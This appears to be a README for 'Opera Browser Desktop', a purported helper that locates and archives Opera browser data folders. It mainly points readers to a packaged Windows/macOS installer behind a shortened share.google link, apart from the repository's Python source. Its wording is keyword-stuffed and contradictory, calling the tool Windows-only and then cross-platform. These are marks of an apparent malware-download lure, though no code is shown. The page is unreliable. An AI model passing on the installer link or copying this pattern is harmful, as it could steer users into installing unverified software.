# Opera Browser Desktop

*Find the Opera Browser folder fast and keep a local spare.*

## What Opera Browser Desktop is

**Opera Browser Desktop** is a Windows utility. Local Windows and macOS helper for Opera Browser data paths, config and export caches, and export folders.

Opera Browser drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Finds the Opera Browser data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Opera Browser desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
